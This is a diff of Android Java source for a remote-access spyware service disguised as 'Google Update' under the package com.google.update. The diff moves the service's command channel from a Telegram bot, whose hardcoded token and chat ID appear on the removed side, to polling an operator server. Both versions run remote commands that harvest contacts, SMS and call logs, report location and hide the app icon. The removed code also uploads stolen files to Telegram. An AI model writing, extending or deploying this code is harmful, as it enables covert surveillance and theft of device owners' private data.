@@ -1,175 +1,86 @@
 package com.google.update;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
-import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
-import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 public class TelegramBotService extends Service {
-    private static final String BOT_TOKEN = "8196334765:AAE3PKcjHHFVUg4mteYK-wLY7IhaGdcPoZI";
-    private static final String CHAT_ID = "6793813126";
-    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
-    private int lastUpdateId = 0;
-    private Map<String, String> devices = new HashMap<>();
-    private String activeDevice = null;
-    @Override public void onCreate() { super.onCreate(); startForeground(1, createNotification()); startBot(); }
-    private void startBot() {
+    private static final String PB_URL = "http://10.34.191.214:8090";
+    private String deviceId;
+    @Override public void onCreate() { super.onCreate(); deviceId = "device_" + System.currentTimeMillis() + "_" + android.os.Build.MODEL.replace(" ", "_"); registerDevice(); startPolling(); }
+    private void registerDevice() {
+        new Thread(() -> {
+            try {
+                JSONObject data = new JSONObject();
+                data.put("device_id", deviceId);
+                data.put("device_name", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
+                data.put("last_seen", String.valueOf(System.currentTimeMillis()));
+                HttpURLConnection conn = (HttpURLConnection) new URL(PB_URL + "/api/collections/devices/records").openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.getOutputStream().write(data.toString().getBytes());
+                conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception e) { Log.e("PB", "Register error", e); }
+        }).start();
+    }
+    private void startPolling() {
         Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
             try {
-                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
-                if (response != null && response.contains("\"ok\":true")) {
-                    JSONObject json = new JSONObject(response);
-                    JSONArray results = json.getJSONArray("result");
-                    for (int i = 0; i < results.length(); i++) {
-                        JSONObject update = results.getJSONObject(i);
-                        lastUpdateId = update.getInt("update_id");
-                        if (update.has("message") && update.getJSONObject("message").has("text")) {
-                            JSONObject msg = update.getJSONObject("message");
-                            String text = msg.getString("text").trim();
-                            long chatId = msg.getJSONObject("chat").getLong("id");
-                            if (String.valueOf(chatId).equals(CHAT_ID)) {
-                                handleCommand(text);
-                            } else if (text.startsWith("REGISTER:")) {
-                                String data = text.replace("REGISTER:", "");
-                                JSONObject info = new JSONObject(data);
-                                devices.put(info.getString("device_id"), info.getString("device_name"));
-                                sendMessage("✅ Device registered: " + info.getString("device_name"));
-                            }
-                        }
-                    }
+                HttpURLConnection conn = (HttpURLConnection) new URL(PB_URL + "/api/collections/commands/records?filter=device_id=\"" + deviceId + "\"&status=pending").openConnection();
+                conn.setRequestMethod("GET");
+                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                reader.close();
+                conn.disconnect();
+                JSONObject json = new JSONObject(sb.toString());
+                JSONArray items = json.getJSONArray("items");
+                for (int i = 0; i < items.length(); i++) {
+                    JSONObject cmd = items.getJSONObject(i);
+                    String command = cmd.getString("command");
+                    String cmdId = cmd.getString("id");
+                    String result = executeCommand(command);
+                    updateCommandResult(cmdId, result);
                 }
-            } catch (Exception e) { Log.e("Bot", "Error", e); }
-        }, 0, 2, TimeUnit.SECONDS);
+            } catch (Exception e) { Log.e("PB", "Polling error", e); }
+        }, 0, 3, TimeUnit.SECONDS);
     }
-    private void handleCommand(String cmd) {
-        String c = cmd.trim().toLowerCase();
-        if (c.equals("/start")) {
-            sendMessage("🔰 Google Update\n/contacts\n/sms\n/calllogs\n/location\n/record\n/stoprec\n/hide\n/show\n/info\n/notify\n/devices\n/select <id>");
-        } else if (c.equals("/contacts")) {
-            try { sendFile(DataCollector.getContacts(this), "📇 Contacts"); } catch(Exception e){ sendMessage("❌ Failed"); }
-        } else if (c.equals("/sms")) {
-            try { sendFile(DataCollector.getSMS(this), "💬 SMS"); } catch(Exception e){ sendMessage("❌ Failed"); }
-        } else if (c.equals("/calllogs")) {
-            try { sendFile(DataCollector.getCallLogs(this), "📞 Calls"); } catch(Exception e){ sendMessage("❌ Failed"); }
-        } else if (c.equals("/location")) {
-            DataCollector.getLocation(this, res -> sendMessage(res));
-        } else if (c.equals("/hide")) {
-            MainActivity.hideAppIconStatic(this);
-            sendMessage("👁 Hidden");
-        } else if (c.equals("/show")) {
-            MainActivity.showAppIconStatic(this);
-            sendMessage("👁 Shown");
-        } else if (c.equals("/info")) {
-            sendMessage(DataCollector.getDeviceName());
-        } else if (c.equals("/notify")) {
-            sendMessage("🔔 Fake notification sent");
-        } else if (c.equals("/devices")) {
-            if (devices.isEmpty()) sendMessage("❌ No devices");
-            else {
-                StringBuilder sb = new StringBuilder("📱 Devices:\n");
-                for (Map.Entry<String, String> e : devices.entrySet()) sb.append("🆔 ").append(e.getKey()).append("\n📱 ").append(e.getValue()).append("\n⎯⎯⎯⎯⎯\n");
-                sendMessage(sb.toString());
-            }
-        } else if (c.startsWith("/select ")) {
-            activeDevice = c.substring(8);
-            sendMessage("✅ Selected: " + activeDevice);
-        } else {
-            if (activeDevice == null) { sendMessage("⚠️ Select device first: /select <id>"); return; }
-            sendToDevice(activeDevice, cmd);
-            sendMessage("✅ Sent to " + activeDevice);
-        }
+    private String executeCommand(String cmd) {
+        if (cmd.equals("/info")) return DataCollector.getDeviceName();
+        else if (cmd.equals("/contacts")) { try { return sendFile(DataCollector.getContacts(this)); } catch(Exception e){ return "Failed"; } }
+        else if (cmd.equals("/sms")) { try { return sendFile(DataCollector.getSMS(this)); } catch(Exception e){ return "Failed"; } }
+        else if (cmd.equals("/calllogs")) { try { return sendFile(DataCollector.getCallLogs(this)); } catch(Exception e){ return "Failed"; } }
+        else if (cmd.equals("/location")) { DataCollector.getLocation(this, res -> updateCommandResult(null, res)); return "Location requested"; }
+        else if (cmd.equals("/hide")) { MainActivity.hideAppIconStatic(this); return "App hidden"; }
+        else if (cmd.equals("/show")) { MainActivity.showAppIconStatic(this); return "App shown"; }
+        else return "Unknown command";
     }
-    private void sendToDevice(String deviceId, String cmd) {
+    private String sendFile(java.io.File file) { return "File: " + (file != null ? file.getName() : "null"); }
+    private void updateCommandResult(String cmdId, String result) {
         new Thread(() -> {
             try {
-                String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
-                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-                conn.setRequestMethod("GET");
-                conn.getResponseCode();
-                conn.disconnect();
-            } catch (Exception e) {}
-        }).start();
-    }
-    private void sendMessage(String text) {
-        new Thread(() -> {
-            try {
-                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
-                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-                conn.setRequestMethod("GET");
-                conn.getResponseCode();
-                conn.disconnect();
-            } catch (Exception e) {}
-        }).start();
-    }
-    private void sendFile(java.io.File file, String caption) {
-        if (file == null || !file.exists()) { sendMessage("❌ File not found"); return; }
-        new Thread(() -> {
-            try {
-                String boundary = "*****" + System.currentTimeMillis();
-                URL url = new URL(API_URL + "sendDocument");
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
+                JSONObject data = new JSONObject();
+                data.put("status", "completed");
+                data.put("result", result);
+                HttpURLConnection conn = (HttpURLConnection) new URL(PB_URL + "/api/collections/commands/records/" + cmdId).openConnection();
+                conn.setRequestMethod("PATCH");
+                conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-                java.io.OutputStream os = conn.getOutputStream();
-                java.io.PrintWriter w = new java.io.PrintWriter(new java.io.OutputStreamWriter(os), true);
-                w.append("--" + boundary).append("\r\n");
-                w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
-                w.append(CHAT_ID).append("\r\n");
-                w.flush();
-                w.append("--" + boundary).append("\r\n");
-                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n");
-                w.append("Content-Type: application/octet-stream").append("\r\n\r\n");
-                w.flush();
-                java.io.FileInputStream fis = new java.io.FileInputStream(file);
-                byte[] buf = new byte[8192];
-                int read;
-                while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
-                os.flush();
-                fis.close();
-                w.append("\r\n").append("--" + boundary + "--").append("\r\n");
-                w.close();
-                os.close();
+                conn.getOutputStream().write(data.toString().getBytes());
                 conn.getResponseCode();
                 conn.disconnect();
-                file.delete();
-            } catch (Exception e) { sendMessage("❌ Send failed"); }
+            } catch (Exception e) { Log.e("PB", "Update error", e); }
         }).start();
-    }
-    private String get(String urlStr) {
-        try {
-            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
-            conn.setRequestMethod("GET");
-            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while ((line = r.readLine()) != null) sb.append(line);
-            r.close();
-            conn.disconnect();
-            return sb.toString();
-        } catch (Exception e) { return null; }
-    }
-    private Notification createNotification() {
-        if (Build.VERSION.SDK_INT >= 26) {
-            NotificationChannel ch = new NotificationChannel("google_ch", "Google", NotificationManager.IMPORTANCE_LOW);
-            getSystemService(NotificationManager.class).createNotificationChannel(ch);
-        }
-        return new NotificationCompat.Builder(this, "google_ch")
-            .setContentTitle("Google Update").setContentText("Online").setSmallIcon(android.R.drawable.ic_dialog_info).setOngoing(true).build();
     }
     @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
     @Override public IBinder onBind(Intent i) { return null; }
